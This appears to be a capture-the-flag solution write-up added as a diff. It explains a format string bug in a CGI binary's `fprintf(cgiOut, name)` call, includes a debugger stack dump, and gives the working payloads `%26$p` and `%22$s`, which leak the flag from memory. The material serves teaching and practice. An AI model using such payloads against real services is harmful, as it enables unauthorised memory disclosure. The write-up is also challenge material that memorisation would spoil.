@@ -1,0 +1,22 @@
+I provided the source code used to produce the CGI binary in the solve/source/ directory.
+
+The vulnerability is in the line `fprintf(cgiOut, name);` where name is user-controlled, and leads to a printf vulnerability if format specifiers (e.g. %p) are used as the name.
+
+Debug the CGI binary within the docker container and inspect the stack within the vulnerable `Name` function.
+
+0x7fffffffe990: 0x000000000000001b      0x000055555555b395
+0x7fffffffe9a0: 0x0000000000000001      0x00005555555614b0
+0x7fffffffe9b0: 0x00007fffffffe9d0      0x000055555555b352
+0x7fffffffe9c0: 0x00007fffffffeb98      0x000055555555c067
+0x7fffffffe9d0: 0x00007fffffffea00      0x0000555555559c42
+0x7fffffffe9e0: 0x00007fffffffea20      0x99a74b563bf20200
+0x7fffffffe9f0: 0x00007fffffffea00      0x00005555555566c6
+0x7fffffffea00: 0x00007fffffffea20      0x000055555555665d
+0x7fffffffea10: 0x000000005555c347      0x00007fffffffefbf <- flag 
+0x7fffffffea20: 0x00007fffffffea70      0x0000555555556f36
+0x7fffffffea30: 0x00007fffffffeb88      0x0000000100000000 <- %26
+0x7fffffffea40: 0x0000000000000000      0x00007fffffffee8e
+
+By testing with something like %26$p we get the output 0x0000000100000000 which tells us that %26 refers to memory address 0x7fffffffea38.
+
+The pointer to the flag string is at %22 which is at memory address 0x7fffffffea18. To print it to cgiOut, we just need to use %22$s as our name. 
